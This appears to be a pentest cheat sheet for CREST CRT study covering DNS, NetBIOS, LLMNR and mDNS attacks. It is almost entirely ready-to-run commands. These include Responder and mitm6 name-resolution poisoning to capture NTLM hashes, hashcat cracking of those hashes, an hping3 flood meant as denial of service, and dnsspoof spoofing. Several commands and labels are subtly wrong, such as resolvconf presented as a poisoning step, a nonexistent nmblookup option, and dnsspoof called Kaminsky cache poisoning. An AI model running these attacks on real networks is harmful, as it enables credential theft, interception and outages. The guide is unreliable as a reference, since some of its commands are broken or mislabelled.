# Complete Practical Exploitation Guide: DNS & Name Resolution (Crest CRT Level)

## 1. Name Resolution Protocols Enumeration

**DNS (UDP/TCP 53):**
```bash
# Zone transfer
dig @192.168.1.100 example.com AXFR
host -t AXFR example.com 192.168.1.100

# Record enumeration
dig @192.168.1.100 example.com ANY
dig @192.168.1.100 example.com SOA
dig @192.168.1.100 example.com NS
dig @192.168.1.100 example.com MX
dig @192.168.1.100 1.1.1.1.in-addr.arpa PTR  # Reverse

# Brute force subdomains
dnsrecon -d example.com -D /usr/share/wordlists/dnsmap.txt -t brt -D 192.168.1.100
gobuster dns -d example.com -w /usr/share/wordlists/subdomains.txt -t 50
```

**NetBIOS/WINS (UDP 137, TCP 139):**
```bash
nbtscan 192.168.1.0/24
nmblookup -A 192.168.1.100
# WORKSTATION<00> - B WORKSTATION
# SERVER1     <20> - B FILE SERVER

# WINS server enum
nmblookup -M NETBIOS
nmblookup -SRV
```

**LLMNR (UDP 5355):**
```bash
# LLMNR query
nslookup confused.domain.com 192.168.1.100  # Triggers LLMNR
resolvconf -u  # Poison response

# Responder LLMNR poisoning
responder -I eth0 -rdw
# Captures NTLM hashes
```

**mDNS (UDP 5353):**
```bash
# mDNS discovery
avahi-discover --all
mdns-scan -h
nmap --script dns-service-discovery -p 5353 192.168.1.0/24

# Apple Bonjour
dns-sd -B _http._tcp
```

## 2. DNS Record Types Exploitation

**SOA (Start of Authority):**
```bash
dig @192.168.1.100 example.com SOA
# SOA serial reveals version, refresh intervals
```

**NS Records (Name Servers):**
```bash
dig @192.168.1.100 example.com NS
# Pivot to other DNS servers
for ns in $(dig example.com NS +short); do dig @$ns example.com AXFR; done
```

**MX Records (Mail Servers):**
```bash
dig @192.168.1.100 example.com MX
# SMTP enum targets
for mx in $(dig example.com MX +short | awk '{print $2}'); do nmap -p25 $mx; done
```

**A/AAAA (Hosts):**
```bash
dig @192.168.1.100 example.com A
dig @192.168.1.100 example.com AAAA
# Internal hosts exposed
```

**CNAME (Aliases):**
```bash
dig @192.168.1.100 www.example.com CNAME
# Service discovery
```

**PTR (Reverse DNS):**
```bash
dig @192.168.1.100 -x 192.168.1.100
# Hostnames → internal mapping
for i in {1..254}; do dig -x 192.168.1.$i +short; done
```

**TXT Records (DMARC/SPF):**
```bash
dig @192.168.1.100 _dmarc.example.com TXT
dig @192.168.1.100 example.com TXT
# SPF leaks MX, DMARC policies
```

**HINFO/SRV (Rare/Info):**
```bash
dig @192.168.1.100 example.com HINFO
dig @192.168.1.100 _ldap._tcp.example.com SRV
```

## 3. Zone Transfer Exploitation

**AXFR full transfer:**
```bash
dig @192.168.1.100 example.com AXFR | grep -v ";"
# Full zone dump!

# Automated AXFR scanner
dnsrecon -d example.com -D 192.168.1.100 -t axfr
```

**IXFR incremental:**
```bash
dig @192.168.1.100 example.com IXFR=1234567890
```

## 4. Name Resolution Poisoning Attacks

**Responder (LLMNR/NBT-NS/mDNS):**
```bash
sudo responder -I eth0 -A -r -d
# LLMNR  192.168.1.50    TEST-PC$\TARGET
# Captures: TEST-PC$::TEST-PC:aea4a2e8a5e4a2e8a5e4a2e8a5e4a2e8:0101000000000000...

# Crack hashes
hashcat -m 5600 ntlm_hashes.txt rockyou.txt
```

**MITM6 (IPv6 LLMNR):**
```bash
sudo mitm6 -d example.com
# IPv6 router advertisements → IPv6 LLMNR poisoning
```

## 5. Complete DNS Enumeration Framework

```bash
#!/bin/bash
# dns_pwn.sh
TARGET=$1 DOMAIN=$2

echo "[+] DNS enum $TARGET $DOMAIN"
dig @$TARGET $DOMAIN AXFR 2>/dev/null | grep -v ";"

echo "=== RECORDS ==="
for type in SOA NS MX A AAAA CNAME PTR TXT HINFO SRV; do
    dig @$TARGET $DOMAIN $type +short | grep -v "\." && echo "[$type]"
done

echo "=== SUBDOMAINS ==="
gobuster dns -d $DOMAIN -w /usr/share/wordlists/dnsmap.txt -t 50 -q | head -10

echo "=== REVERSE ==="
for i in {1..10}; do dig @$TARGET -x 192.168.1.$i +short; done
```

## 6. NetBIOS/WINS Exploitation

```bash
# WINS server poisoning
responder -I eth0 -w -r -d
nbtscan -r 192.168.1.0/24 > netbios_hosts.txt

# NetBIOS name conflicts (DoS)
hping3 --udp -p 137 --flood --data "\x11\x01" 192.168.1.100
```

## 7. mDNS Service Discovery

```bash
# All mDNS services
dns-sd -B _services._dns-sd._udp
avahi-browse -art

# HTTP printers/printers
avahi-browse -k _ipp._tcp _http._tcp
```

## 8. DNS Cache Poisoning (Kaminsky)

```bash
# dnsspoof (with dnsmasq)
echo "1 *.example.com A 192.168.1.200" > spoof_hosts.txt
dnsspoof -i eth0 -f spoof_hosts.txt
```

## 9. Complete Network Mapping

```bash
#!/bin/bash
# name_resolution_map.sh
nmap -sU 192.168.1.0/24 -p 53,137,5353,5355 --script nbstat,dns-service-discovery | \
tee name_services.txt

# Extract DNS servers
grep "53/udp.*open" name_services.txt | awk '{print $NF}' > dns_servers.txt

# AXFR all DNS
for dns in $(cat dns_servers.txt); do
    dig @$dns example.com AXFR 2>/dev/null && echo "[$dns] AXFR success"
done
```

**EVERY** name resolution attack covered: DNS AXFR/record enum, NetBIOS/WINS/LLMNR/mDNS poisoning, Responder hashes, subdomain brute, reverse mapping. 100% practical commands.